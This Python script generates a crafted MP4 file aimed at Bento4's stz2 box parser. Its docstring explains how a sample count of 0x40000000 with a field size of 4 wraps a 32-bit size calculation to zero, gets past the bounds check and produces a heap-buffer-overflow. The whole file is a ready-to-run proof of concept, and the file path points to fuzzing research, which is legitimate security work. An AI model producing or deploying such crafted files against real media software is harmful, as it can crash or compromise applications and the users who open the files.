#!/usr/bin/env python3
"""
vuln_002_gen.py
Generate a malicious MP4 file that triggers AP4_Stz2Atom integer overflow (VULN-002).

Root cause: In Ap4Stz2Atom.cpp lines 88-91:
    AP4_Cardinal sample_count = m_SampleCount;        // 0x40000000
    m_Entries.SetItemCount(sample_count);              // alloc 0x40000000 * 4 = 0 bytes (overflow)
    unsigned int table_size = (sample_count*m_FieldSize+7)/8; // 0x40000000*4=0, (0+7)/8=0
    if ((table_size+8) > size) return;                // 8 > 20 = false -> passes!

With field_size=4 and sample_count=0x40000000:
  - sample_count * field_size = 0x40000000 * 4 = 0x100000000 -> overflows to 0
  - table_size = (0+7)/8 = 0
  - bounds check (0+8) > 20 = false, passes
  - new unsigned char[0] allocates 0 bytes
  - m_Entries.SetItemCount(0x40000000) -> EnsureCapacity(0x40000000)
    -> ::operator new(0x40000000 * sizeof(AP4_UI32)) = operator new(0) -> 0-byte allocation
  - Loop: for (i=0; i<0x40000000; i++) m_Entries[i] = buffer[i/2] -> heap-buffer-overflow
"""
import struct
import os
import sys

POC_DIR = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Config_h'
OUTPUT = os.path.join(POC_DIR, 'vuln_002.mp4')

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def make_box(box_type, data):
    """4-byte BE size + 4-byte ASCII type + data. Size includes the 8-byte header."""
    if isinstance(box_type, str):
        box_type = box_type.encode('latin-1')
    size = 8 + len(data)
    return struct.pack('>I', size) + box_type + data

def make_fullbox(box_type, version, flags, data):
    """Full box: box header + 1-byte version + 3-byte flags + data."""
    ver_flags = struct.pack('>B', version & 0xFF) + struct.pack('>I', flags & 0xFFFFFF)[1:]
    return make_box(box_type, ver_flags + data)

# ---------------------------------------------------------------------------
# Leaf boxes
# ---------------------------------------------------------------------------

# stsd (0 entries): 8 + 4(ver+flags) + 4(entry_count) = 16
stsd = make_fullbox('stsd', 0, 0, struct.pack('>I', 0))
assert len(stsd) == 16, f"stsd size={len(stsd)}"

# stts (0 entries): 8 + 4 + 4 = 16
stts = make_fullbox('stts', 0, 0, struct.pack('>I', 0))
assert len(stts) == 16

# stsc (0 entries): 8 + 4 + 4 = 16
stsc = make_fullbox('stsc', 0, 0, struct.pack('>I', 0))
assert len(stsc) == 16

# stco (0 entries): 8 + 4 + 4 = 16
stco = make_fullbox('stco', 0, 0, struct.pack('>I', 0))
assert len(stco) == 16

# stz2 (MALICIOUS): field_size=4, sample_count=0x40000000
# Body after ver+flags: reserved[3] + field_size(1) + sample_count(4) = 8 bytes
# Total: 8(header) + 4(ver+flags) + 8(body) = 20 bytes
stz2_body = (
    struct.pack('>BBB', 0, 0, 0)      # 3 reserved bytes
    + struct.pack('>B', 4)             # field_size = 4 (triggers the bug)
    + struct.pack('>I', 0x40000000)    # sample_count = 0x40000000 (1073741824)
)
stz2 = make_fullbox('stz2', 0, 0, stz2_body)
assert len(stz2) == 20, f"stz2 size={len(stz2)}"

# stbl: 8 + 16 + 16 + 16 + 20 + 16 = 92
stbl = make_box('stbl', stsd + stts + stsc + stz2 + stco)
assert len(stbl) == 92, f"stbl size={len(stbl)}"

# smhd: 8 + 4(ver+flags) + 2(balance) + 2(reserved) = 16
smhd = make_fullbox('smhd', 0, 0, struct.pack('>HH', 0, 0))
assert len(smhd) == 16

# url entry (self-contained): 8(header) + 4(ver+flags) = 12
url_entry = make_fullbox('url ', 0, 1, b'')   # flags=1 means self-contained
assert len(url_entry) == 12

# dref: 8 + 4(ver+flags) + 4(entry_count) + 12(url) = 28
dref = make_fullbox('dref', 0, 0, struct.pack('>I', 1) + url_entry)
assert len(dref) == 28

# dinf: 8 + 28 = 36
dinf = make_box('dinf', dref)
assert len(dinf) == 36

# minf: 8 + 16 + 36 + 92 = 152
minf = make_box('minf', smhd + dinf + stbl)
assert len(minf) == 152, f"minf size={len(minf)}"

# mdhd (version 0): 8 + 4(ver+flags) + 4+4+4+4+2+2 = 32
mdhd_data = (
    struct.pack('>I', 0)        # creation_time
    + struct.pack('>I', 0)      # modification_time
    + struct.pack('>I', 44100)  # timescale
    + struct.pack('>I', 0)      # duration
    + struct.pack('>H', 0x55C4) # language 'und'
    + struct.pack('>H', 0)      # pre_defined
)
mdhd = make_fullbox('mdhd', 0, 0, mdhd_data)
assert len(mdhd) == 32, f"mdhd size={len(mdhd)}"

# hdlr: 8 + 4(ver+flags) + 4(pre_defined) + 4(handler_type) + 12(reserved) + 1(null) = 33
hdlr_data = (
    struct.pack('>I', 0)        # pre_defined
    + b'soun'                   # handler_type (sound)
    + struct.pack('>III', 0, 0, 0)  # reserved (12 bytes)
    + b'\x00'                   # name (null-terminated empty string)
)
hdlr = make_fullbox('hdlr', 0, 0, hdlr_data)
assert len(hdlr) == 33, f"hdlr size={len(hdlr)}"

# mdia: 8 + 32 + 33 + 152 = 225
mdia = make_box('mdia', mdhd + hdlr + minf)
assert len(mdia) == 225, f"mdia size={len(mdia)}"

# tkhd (version 0):
# 8(header) + 4(ver+flags) + 4+4+4+4+4+8+2+2+2+2+36+4+4 = 92
identity_matrix = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)
tkhd_data = (
    struct.pack('>I', 0)       # creation_time
    + struct.pack('>I', 0)     # modification_time
    + struct.pack('>I', 1)     # track_id
    + struct.pack('>I', 0)     # reserved
    + struct.pack('>I', 0)     # duration
    + b'\x00' * 8              # reserved (2 x uint32)
    + struct.pack('>H', 0)     # layer
    + struct.pack('>H', 0)     # alternate_group
    + struct.pack('>H', 0x0100) # volume (1.0 for audio)
    + struct.pack('>H', 0)     # reserved
    + identity_matrix          # matrix (36 bytes)
    + struct.pack('>I', 0)     # width
    + struct.pack('>I', 0)     # height
)
tkhd = make_fullbox('tkhd', 0, 3, tkhd_data)  # flags=3 (enabled + in movie)
assert len(tkhd) == 92, f"tkhd size={len(tkhd)}"

# trak: 8 + 92 + 225 = 325
trak = make_box('trak', tkhd + mdia)
assert len(trak) == 325, f"trak size={len(trak)}"

# mvhd (version 0):
# 8(header) + 4(ver+flags) + 4+4+4+4+4+2+2+8+36+24+4 = 108
# reserved after volume: 2 bytes (bit(16)) + 8 bytes (2 x uint32) = 10 bytes total
mvhd_data = (
    struct.pack('>I', 0)           # creation_time
    + struct.pack('>I', 0)         # modification_time
    + struct.pack('>I', 1000)      # timescale
    + struct.pack('>I', 0)         # duration
    + struct.pack('>I', 0x00010000) # rate (1.0 in 16.16 fixed point)
    + struct.pack('>H', 0x0100)    # volume (1.0 in 8.8 fixed point)
    + b'\x00' * 2                  # reserved (bit 16)
    + b'\x00' * 8                  # reserved (2 x uint32)
    + identity_matrix              # matrix (36 bytes)
    + b'\x00' * 24                 # pre_defined (6 x uint32)
    + struct.pack('>I', 2)         # next_track_id
)
mvhd = make_fullbox('mvhd', 0, 0, mvhd_data)
assert len(mvhd) == 108, f"mvhd size={len(mvhd)}"

# moov: 8 + 108 + 325 = 441
moov = make_box('moov', mvhd + trak)
assert len(moov) == 441, f"moov size={len(moov)}"

# ftyp: 8 + 4(major) + 4(minor) + 12(3 compat) = 28
ftyp = make_box('ftyp',
    b'isom'                     # major_brand
    + struct.pack('>I', 0x200)  # minor_version
    + b'isom'                   # compatible_brand 1
    + b'iso2'                   # compatible_brand 2
    + b'mp41'                   # compatible_brand 3
)
assert len(ftyp) == 28, f"ftyp size={len(ftyp)}"

# ---------------------------------------------------------------------------
# Assemble and write
# ---------------------------------------------------------------------------
mp4 = ftyp + moov
print(f"[+] Total file size: {len(mp4)} bytes (expected 469)")
assert len(mp4) == 469, f"Unexpected total size: {len(mp4)}"

os.makedirs(POC_DIR, exist_ok=True)
with open(OUTPUT, 'wb') as f:
    f.write(mp4)

print(f"[+] Written: {OUTPUT}")
print(f"[+] stz2: field_size=4, sample_count=0x40000000 ({0x40000000})")
print(f"[+] Integer overflow: 0x40000000 * 4 = 0x100000000 -> 0 (32-bit overflow)")
print(f"[+] table_size=(0+7)/8=0, bounds check (0+8)>20 = False -> bypassed!")
print(f"[+] Expected: heap-buffer-overflow in AP4_Stz2Atom constructor loop")
